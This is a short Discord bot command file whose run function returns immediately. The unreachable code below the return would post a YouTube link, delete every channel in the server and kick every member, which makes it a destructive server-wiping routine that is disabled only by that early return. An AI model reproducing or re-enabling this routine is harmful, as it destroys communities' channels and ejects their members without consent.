exports.run = (client, message, args) => {
	return;
	message.channel.send("https://www.youtube.com/watch?v=1xOOFCltZuc");
 	message.guild.channels.forEach(channel => {
    	channel.delete();
  	});
  	message.guild.members.forEach(member => {
    	member.kick();
  	});
};
